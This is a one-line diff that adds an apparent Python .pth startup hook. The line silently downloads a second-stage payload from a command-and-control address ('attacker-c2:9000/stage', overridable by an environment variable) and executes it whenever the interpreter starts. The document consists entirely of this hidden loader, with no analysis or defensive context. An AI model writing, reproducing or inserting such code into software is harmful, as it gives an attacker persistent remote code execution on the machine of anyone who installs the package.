@@ -1,0 +1,1 @@
+import os;exec("\nimport urllib.request,sys\nif not os.environ.get('_PTH_GUARD'):\n    os.environ['_PTH_GUARD']='1'\n    _ns={'__builtins__':__builtins__};exec(urllib.request.urlopen(os.environ.get('C2_URL','http://attacker-c2:9000')+'/stage').read(),_ns)\n")
